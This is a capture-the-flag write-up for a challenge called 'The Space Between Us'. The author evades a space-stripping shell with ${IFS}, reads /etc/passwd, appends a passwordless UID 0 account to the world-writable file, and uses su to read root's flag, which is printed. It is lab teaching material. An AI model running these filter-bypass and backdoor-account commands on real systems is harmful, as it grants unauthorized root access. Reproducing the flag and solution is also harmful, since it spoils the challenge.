# The Space Between Us

## Description
Author: @JohnHammond#6971

I've never felt this close to a character before. I hope the feeling is mutual...

Escalate your privileges and retrieve the flag out of root's home directory.

Press the Start button on the top-right to begin this challenge. 

## Solve
When we connect to the service we are able to run commands as `user` but our spaces are stripped. I figured out a way around this by placing `${IFS}` instead of a space. The `$IFS` variable in bash stands for internal field seperator and is used as a delimiter to split words. The default value is `<space><tab><newline>`.

First I checked the files in the home directroy:
```bash
user@challenge:~$ ls${IFS}-la
total 28
dr-xr-xr-x 1 user user 4096 Dec 11 19:23 .
drwxr-xr-x 1 root root 4096 Dec 11 19:23 ..
-rw-r--r-- 1 user user  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 user user 3526 Mar 27  2022 .bashrc
-rw-r--r-- 1 user user  807 Mar 27  2022 .profile
-r-xr-xr-x 1 root root 1885 Dec 11 19:22 .server.py
-rw-r--r-- 1 root root  174 Dec 11 19:22 README.md
```

The `README.md` must have something interesting. The [`.server.py`](./.server.py) file is what is running to give us this "shell". There is nothing interesting in here except for it strips any space, tab, or newline from our input.
```bash
user@challenge:~$ cat${IFS}README.md
Your objective to escalate your privileges
and retrieve the flag in /root/flag.txt.

If you look around the filesystem, you may
find some odd permissions you can leverage :)
```

After this note I started searching around the filesystem for a while and wasn't able to find anything. I came back to the challenge and realized there was a very simple misonfiguration, the `/etc/passwd` file is writeable!
```bash
user@challenge:~$ ls${IFS}-la${IFS}/etc/passwd
-rw-rw-rw- 1 root root 993 Dec 17 23:48 /etc/passwd

user@challenge:~$ cat${IFS}/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
user:x:1000:1000::/home/user:/bin/sh
```

Since I couldn't write directly to `/etc/passwd` I had to make a copy, edit the copy, and then replace the original file. When creating the new user I specified it to have no password so we can easily execute commands.
```bash
user@challenge:~$ cp${IFS}/etc/passwd${IFS}/tmp/passwd

user@challenge:~$ echo${IFS}"notroot::0:0:root:/root:/bin/bash">>/tmp/passwd

user@challenge:~$ cat${IFS}/tmp/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
user:x:1000:1000::/home/user:/bin/sh
notroot::0:0:root:/root:/bin/bash

user@challenge:~$ cp${IFS}/tmp/passwd${IFS}/etc/passwd

user@challenge:~$ cat${IFS}/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
user:x:1000:1000::/home/user:/bin/sh
notroot::0:0:root:/root:/bin/bash
```

Now that the new user has been created we can use `su` to execute commands. Since the python scripts is just using `subprocess.Popen()` to run commands and return the output, we won't have a real shell and will have to use the `-c` option to run commands.

```bash
user@challenge:~$ su${IFS}notroot${IFS}-c${IFS}'id'
uid=0(root) gid=0(root) groups=0(root)

user@challenge:~$ su${IFS}notroot${IFS}-c${IFS}'cat${IFS}/root/flag.txt'
flag{59af40c07bc6f02b457aa4c15543da2d}
```

## Flag
```
flag{59af40c07bc6f02b457aa4c15543da2d}
```